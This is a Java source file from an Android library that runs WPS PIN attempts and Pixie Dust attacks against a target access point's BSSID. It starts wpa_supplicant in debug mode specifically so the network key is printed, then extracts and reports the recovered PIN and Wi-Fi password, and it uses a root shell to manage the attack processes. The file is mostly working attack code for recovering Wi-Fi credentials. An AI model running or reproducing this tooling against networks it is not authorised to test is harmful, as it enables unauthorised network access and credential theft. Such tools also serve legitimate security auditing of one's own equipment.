package sangiorgi.wps.lib.services;

import android.content.Context;
import android.os.SystemClock;
import android.util.Log;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.TimeoutException;
import sangiorgi.wps.lib.commands.*;
import sangiorgi.wps.lib.ndk.WpsConfig;
import sangiorgi.wps.lib.ndk.WpsNative;

/**
 * WPS command executor using NDK-based native code. Provides async operations, error handling, and
 * supports both standard WPS and Pixie Dust attacks.
 */
public class WpsExecutor implements AutoCloseable {

  private static final String TAG = "WpsExecutor";
  private static final int DEFAULT_TIMEOUT_SECONDS = 30;
  private static final int PIXIE_DUST_TIMEOUT_SECONDS = 120;

  private final ExecutorService executorService;
  private final CountDownLatch environmentReady = new CountDownLatch(1);
  private volatile boolean isCleanedUp = false;

  private final Context context;
  private final WpsNative wpsNative;

  public WpsExecutor(Context context) {
    this.context = context.getApplicationContext();
    this.wpsNative = new WpsNative(this.context);
    // Use a fixed thread pool bounded by CPU cores to prevent OOM from unbounded thread creation
    int coreCount = Runtime.getRuntime().availableProcessors();
    this.executorService = Executors.newFixedThreadPool(Math.max(2, coreCount));
    initializeEnvironment();
  }

  private void initializeEnvironment() {
    // With NDK, environment setup is minimal - native library loads in WpsNative constructor
    executorService.execute(() -> {
      try {
        if (!wpsNative.isAvailable()) {
          Log.e(TAG, "Native library not available");
        } else {
          Log.i(TAG, "NDK environment ready");
        }
      } finally {
        environmentReady.countDown();
      }
    });
  }

  /**
   * Wait for the environment setup to complete.
   *
   * @param timeout Maximum time to wait
   * @param unit Time unit
   * @return true if the environment is ready, false if timed out
   */
  public boolean awaitReady(long timeout, TimeUnit unit) throws InterruptedException {
    return environmentReady.await(timeout, unit);
  }

  /** Get the WpsNative instance for direct native operations. */
  public WpsNative getWpsNative() {
    return wpsNative;
  }

  /**
   * Execute WPS connection using NDK native code.
   *
   * @param bssid Target BSSID
   * @param pin WPS PIN
   * @return CompletableFuture with WpsResult
   */
  public CompletableFuture<WpsResult> executeWpsConnection(String bssid, String pin) {
    return CompletableFuture.supplyAsync(
        () -> {
          // Ensure environment is ready before executing
          try {
            if (!environmentReady.await(10, TimeUnit.SECONDS)) {
              return createErrorResult(bssid, pin, "Environment setup timed out");
            }
          } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            return createErrorResult(bssid, pin, "Interrupted waiting for environment setup");
          }

          if (!wpsNative.isAvailable()) {
            return createErrorResult(bssid, pin, "Native library not available");
          }

          return executeNativeWps(bssid, pin);
        },
        executorService);
  }

  private WpsResult executeNativeWps(String bssid, String pin) {
    String confPath = WpsConfig.ensureConfigFile(context);
    String ctrlDir = WpsNative.getCtrlDir();

    // Debug mode (-d) is required: the Network Key hexdump is at MSG_DEBUG level.
    // Without -d, wpa_supplicant only outputs MSG_INFO+, so the password is never
    // printed to stdout and cannot be extracted. -K (already set) then ensures the
    // key material is shown instead of [REMOVED].
    long handle = wpsNative.startWpaSupplicant("wlan0", confPath, ctrlDir, true);
    if (handle == 0) {
      return createErrorResult(bssid, pin, "Failed to start wpa_supplicant");
    }

    try {
      // Wait for wpa_supplicant to initialize
      SystemClock.sleep(2000);

      // Send WPS_REG command
      wpsNative.wpsReg(bssid, pin);

      // Read WPS result with timeout
      sangiorgi.wps.lib.ndk.WpsResult nativeResult =
          wpsNative.readWpsResult(handle, DEFAULT_TIMEOUT_SECONDS * 1000);

      // Convert native result to library WpsResult
      return convertNativeResult(bssid, pin, nativeResult);

    } finally {
      wpsNative.stopWpaSupplicant(handle);
    }
  }

  private WpsResult convertNativeResult(String bssid, String pin,
      sangiorgi.wps.lib.ndk.WpsResult nativeResult) {
    List<CommandResult> results = new ArrayList<>();
    List<String> output = new ArrayList<>();

    if (nativeResult == null) {
      output.add("No response from wpa_supplicant");
      results.add(new CommandResult(false, output, null, WpsCommand.CommandType.WPA_SUPPLICANT));
      return new WpsResult(bssid, pin, results);
    }

    boolean success = nativeResult.isSuccess();
    String rawLine = nativeResult.getRawLine();
    String networkKey = nativeResult.getNetworkKey();

    if (rawLine != null) output.add(rawLine);

    switch (nativeResult.getStatus()) {
      case SUCCESS:
        output.add("WPS-SUCCESS");
        if (networkKey != null) output.add("Network Key: " + networkKey);
        break;
      case FOUR_FAIL:
        output.add("WPS-FAIL msg=8 config_error=18");
        break;
      case THREE_FAIL:
        output.add("WPS-FAIL msg=8");
        break;
      case LOCKED:
        output.add("WPS-FAIL config_error=15");
        output.add("setup locked");
        break;
      case TIMEOUT:
        output.add("WPS-TIMEOUT");
        break;
      case SELINUX:
        output.add("SELinux denied");
        break;
      default:
        output.add("WPS-FAIL");
        break;
    }

    results.add(new CommandResult(success, output, null, WpsCommand.CommandType.WPA_SUPPLICANT));
    WpsResult result = new WpsResult(bssid, pin, results);
    if (networkKey != null) {
      result.setPassword(networkKey);
    }
    return result;
  }

  /**
   * Execute Pixie Dust attack using NDK native code.
   *
   * @param bssid Target BSSID
   * @return CompletableFuture with WpsResult containing PIN and password if successful
   */
  public CompletableFuture<WpsResult> executePixieDust(String bssid) {
    return CompletableFuture.supplyAsync(
        () -> {
          // Ensure environment is ready before executing
          try {
            if (!environmentReady.await(10, TimeUnit.SECONDS)) {
              return createErrorResult(bssid, "N/A", "Environment setup timed out");
            }
          } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            return createErrorResult(bssid, "N/A", "Interrupted waiting for environment setup");
          }

          if (!wpsNative.isAvailable()) {
            return createErrorResult(bssid, "N/A", "Native library not available");
          }

          PixieDustExecutor pixieExecutor = new PixieDustExecutor(context, this);

          try {
            PixieDustExecutor.PixieDustResult result =
                pixieExecutor
                    .executePixieDust(bssid)
                    .get(PIXIE_DUST_TIMEOUT_SECONDS, TimeUnit.SECONDS);

            return buildPixieDustResult(bssid, result);

          } catch (TimeoutException e) {
            Log.e(TAG, "Pixie Dust attack timed out", e);
            return createErrorResult(
                bssid, "N/A", "Attack timed out after " + PIXIE_DUST_TIMEOUT_SECONDS + " seconds");
          } catch (InterruptedException e) {
            Log.e(TAG, "Pixie Dust attack was interrupted", e);
            Thread.currentThread().interrupt();
            return createErrorResult(bssid, "N/A", "Attack was interrupted");
          } catch (Exception e) {
            Log.e(TAG, "Pixie Dust attack failed", e);
            return createErrorResult(bssid, "N/A", "Attack failed: " + e.getMessage());
          }
        },
        executorService);
  }

  private WpsResult buildPixieDustResult(String bssid, PixieDustExecutor.PixieDustResult result) {
    List<CommandResult> results = new ArrayList<>();
    List<String> output = new ArrayList<>();

    output.add(result.getMessage());

    if (result.getPin() != null) {
      output.add("Discovered PIN: " + result.getPin());
    }

    if (result.getPassword() != null) {
      output.add("WiFi Password: " + result.getPassword());
    }

    results.add(
        new CommandResult(result.isSuccess(), output, null, WpsCommand.CommandType.PIXIE_DUST));

    // Add WPS results if available
    if (result.getWpsResult() != null) {
      results.addAll(result.getWpsResult().getResults());
    }

    String pin = result.getPin() != null ? result.getPin() : "N/A";
    WpsResult wpsResult = new WpsResult(bssid, pin, results);

    if (result.getPassword() != null) {
      wpsResult.setPassword(result.getPassword());
    }

    return wpsResult;
  }

  private WpsResult createErrorResult(String bssid, String pin, String errorMessage) {
    List<CommandResult> errorResults =
        List.of(
            new CommandResult(false, List.of(errorMessage), null, WpsCommand.CommandType.WPA_CLI));
    return new WpsResult(bssid, pin, errorResults);
  }

  /** Cancel all running WPS operations */
  public void cancel() {
    if (isCleanedUp) {
      return;
    }

    killWpsProcesses();
  }

  private void killWpsProcesses() {
    try {
      com.topjohnwu.superuser.Shell.cmd(
          "killall libwpa_supplicant_exec.so 2>/dev/null",
          "killall libwpa_cli_exec.so 2>/dev/null",
          "killall libpixiewps_exec.so 2>/dev/null"
      ).exec();
    } catch (Exception e) {
      Log.e(TAG, "Error killing WPS processes", e);
    }
  }

  /** Cleanup resources and shutdown executor */
  public void cleanup() {
    if (isCleanedUp) {
      return;
    }

    isCleanedUp = true;
    cancel();
    shutdownExecutor();
  }

  private void shutdownExecutor() {
    executorService.shutdown();
    try {
      if (!executorService.awaitTermination(5, TimeUnit.SECONDS)) {
        executorService.shutdownNow();
      }
    } catch (InterruptedException e) {
      executorService.shutdownNow();
      Thread.currentThread().interrupt();
    }
  }

  @Override
  public void close() {
    cleanup();
  }
}
